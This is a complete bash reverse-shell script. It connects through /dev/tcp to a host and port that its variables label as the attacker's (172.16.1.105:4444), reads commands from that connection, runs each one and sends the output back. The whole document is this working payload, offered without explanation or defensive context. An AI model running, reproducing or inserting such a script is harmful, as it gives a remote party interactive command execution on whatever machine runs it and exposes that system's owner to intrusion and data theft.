#!/bin/bash

attacker_ip=172.16.1.105
attacker_port=4444
exec 5<>/dev/tcp/$attacker_ip/$attacker_port
cat <&5 | while read line; do $line 2>&5 >&5; done
